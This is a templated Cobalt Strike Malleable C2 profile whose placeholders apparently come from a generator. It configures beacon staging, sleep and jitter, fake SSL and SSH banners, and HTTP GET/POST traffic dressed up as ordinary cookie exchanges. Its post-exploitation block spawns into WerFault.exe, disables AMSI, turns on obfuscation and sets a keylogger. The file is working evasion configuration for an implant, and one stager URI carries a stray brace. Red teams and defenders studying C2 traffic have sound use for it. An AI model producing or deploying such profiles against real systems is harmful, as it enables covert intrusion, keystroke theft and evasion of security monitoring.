## Cobalt Strike Malleable C2 Profile
## Version: Cobalt Strike 4.2
## Date   : ${timestamp}

## Profile Name
##set sample_name "${sample_name}";

## Sleep Times
set sleeptime "${sleeptime}";
set jitter    "${jitter}";

## Beacon maxdns
set maxdns    "${maxdns}";

## DNS servers
set dns_idle "${dns_idle}";

## Beacon User-Agent
set useragent "${useragent}";

## Self-signed SSL Certificates with SSL Beacon
## Stager
https-certificate {

    set C   "${https_certificate_C}";
    set CN  "${https_certificate_CN}";
    set O   "${https_certificate_O}";
    set OU  "${https_certificate_OU}";
    set validity "${https_certificate_V}";
}

##Valid SSL Certificates with SSL Beacon
##https-certificate {
##    set keystore "domain.store";
##    set password "mypassword";
##}

##DNS Beacons
##dns-beacon “optional-variant-name” {
##    # Options moved into 'dns-beacon' group in 4.3:
##    set dns_idle              "1.2.3.4";
##    set dns_max_txt           "199";
##    set dns_sleep             "1";
##    set dns_ttl               "5";
##    set maxdns                "200";
##    set dns_stager_prepend    "doc-stg-prepend";
##    set dns_stager_subhost    "doc-stg-sh.";
##
##    # DNS subhost override options added in 4.3:
##    set beacon                "doc.bc.";
##    set get_A                 "doc.1a.";
##    set get_AAAA              "doc.4a.";
##    set get_TXT               "doc.tx.";
##    set put_metadata          "doc.md.";
##    set put_output            "doc.po.";
##    set ns_response           "zero";
##}

##Code Signing Certificate
##code-signer {
##    set keystore "keystore.jks";
##    set password "password";
##    set alias    "server";
##}

## Staging process
set host_stage "${host_stage}";

http-stager {
    set uri_x86 "/webapi/v6/Update";
    set uri_x64 "/webapi/v3/Update}";

    server {
        header "Content-Type" "application/octet-stream";
        header "Connection" "Keep-Alive";
        header "Server" "Apache";
        output {
            #prepend " ";
            #append "";
            print;

        }
    }

    client {
        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
    }
}

## SSH beacons
##Note that the format is word_##, where CS will auto include a two digit number in the "##" field.
set ssh_banner "Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-1065-aws x86_64)";
set ssh_pipename "SearchText_##";

##http-config
http-config {
    set headers "Date,Server, Content-Length, Keep-Alive,
    Connection, Content-Type";
    header "Server" "Apache";
    header "Keep-Alive" "timeout=10, max=100";
    header "Connection" "Keep-Alive";

    #This option decides if Cobalt Strike uses the X-Forwarded-For HTTP header to determine the remote address of a request.
    #Use this option if your Cobalt Strike server is behind an HTTP redirector.
    set trust_x_forwarded_for "true";
    #By default, requests from user agents that start with curl, lynx, or wget are all blocked
    #set block_useragents "curl*,lynx*,wget*";
}

## Post Exploitation
post-ex {
    set spawnto_x86 "%windir%\\syswow64\\WerFault.exe";
    set spawnto_x64 "%windir%\\sysnative\\WerFault.exe";
    set obfuscate "true";
    set smartinject "true";
    set amsi_disable "true";
    set pipename "msrpc_####";
    set keylogger "GetAsyncKeyState";
    #set thread_hint ""; # specify as module!function+0x##
}

## HTTP GET
http-get {

    set uri "${http_get_uri}";

    client {

        header "Accept-Encoding" "gzip, deflate";
        header "Host" "${http_get_host}";

        metadata {
            base64;
            prepend "session-token=";
            prepend "__Secure-3PAPISID=noskin;";
            append "CONSENT=YES+CN.zh-CN+20210917-09-0";
            header "Cookie";
        }
    }

    server {

        header "Server" "${http_getReq_Server}";
        header "Cache-Control" "private, max-age=0";
        header "X-Frame-Options" "SAMEORIGIN";
        header "Content-Encoding" "gzip";

        output {
            print;
        }
    }
}

## HTTP POST
http-post {

    set uri "${http_post_uri}";

    client {

        header "Accept" "*/*";
        header "Content-Type" "${http_post_request_content}";
        ${random_header}
        header "Host" "${http_post_host}";

        parameter ${http_post_parameter1};

        id {
            parameter "${http_post_id}";
        }

        parameter ${http_post_parameter2};

        output {
            ${http_post_encode}
            print;
        }
    }

    server {

        header "Server" "${http_post_server}";
        header "Content-Type" "${http_post_response_content}";
        header "Connection" "${Connection}";
        header "X-Frame-Options" "SAMEORIGIN";

        output {
            print;
        }
    }
}